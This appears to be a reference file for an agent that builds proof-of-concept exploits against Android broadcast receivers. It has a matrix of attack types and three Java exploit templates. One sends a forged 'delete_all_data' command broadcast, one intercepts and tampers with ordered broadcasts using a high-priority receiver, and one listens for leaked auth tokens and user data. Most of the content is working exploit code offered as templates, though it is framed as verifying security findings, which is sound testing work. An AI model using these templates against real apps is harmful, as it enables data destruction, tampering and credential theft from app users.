---
name: poc-app-broadcast
description: Broadcast PoC reference covering dynamic receiver abuse, ordered-broadcast hijack, permission bypass, and global broadcast leakage.
---

# Broadcast PoC Reference

Use this reference for attacker-controlled or attacker-observable broadcast flows. Broadcast PoCs usually fit `direct-trigger` or `interception` mode.

## Construction Matrix

| Vulnerability | Exploit mode | Typical support | Visible success |
|---------------|--------------|-----------------|-----------------|
| dynamic receiver abuse | `direct-trigger` | none | receiver accepts attacker command |
| ordered hijack | `interception` | runtime receiver | result is modified or broadcast is aborted |
| permission bypass | `direct-trigger` | manifest permission declaration | protected broadcast still sends or lands |
| global leak | `interception` | runtime receiver | sensitive extras are captured |

## Pattern 1 - Direct Broadcast Send

Use for `BroadcastDynamicAbuseExploit` and many permission-bypass cases.

```java
public final class BroadcastDynamicAbuseExploit extends Exploit {
    public BroadcastDynamicAbuseExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        Intent intent = new Intent("com.target.INTERNAL_ACTION");
        intent.putExtra("command", "delete_all_data");
        intent.putExtra("confirm", true);
        context.sendBroadcast(intent);
        log("Sent attacker-controlled broadcast to com.target.INTERNAL_ACTION");
    }
}
```

Use when:

- the verified finding is about a receiver trusting attacker-supplied action strings or extras

## Pattern 2 - Ordered-Broadcast Interception

Use for `BroadcastOrderedHijackExploit`.

```java
public final class BroadcastOrderedHijackExploit extends Exploit {
    public BroadcastOrderedHijackExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        IntentFilter filter = new IntentFilter("com.target.ORDERED_ACTION");
        filter.setPriority(999);

        BroadcastReceiver interceptor = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                log("Intercepted ordered broadcast");
                setResultData("tampered_result");
            }
        };

        context.registerReceiver(interceptor, filter, Context.RECEIVER_EXPORTED);

        Intent intent = new Intent("com.target.ORDERED_ACTION");
        context.sendOrderedBroadcast(intent, null);
    }
}
```

Success signal:

- modified result reaches the next receiver, or
- the ordered flow is aborted

## Pattern 3 - Broadcast Leak Listener

Use for `BroadcastLocalLeakExploit`.

```java
public final class BroadcastLocalLeakExploit extends Exploit {
    public BroadcastLocalLeakExploit(Context context) {
        super(context);
    }

    @Override
    public void execute() {
        IntentFilter filter = new IntentFilter("com.target.SENSITIVE_DATA_ACTION");
        BroadcastReceiver listener = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                log("Leaked token: " + intent.getStringExtra("auth_token"));
                log("Leaked user data: " + intent.getStringExtra("user_data"));
            }
        };
        context.registerReceiver(listener, filter, Context.RECEIVER_EXPORTED);
        log("Registered broadcast listener and waiting for target broadcast");
    }
}
```

Use when:

- the target leaks sensitive extras through a global broadcast

## Manifest Notes

- declare the target custom permission only for permission-bypass cases where `protectionLevel` is weak enough to be attacker-obtainable
- do not declare unnecessary receiver components if a runtime receiver already demonstrates the finding
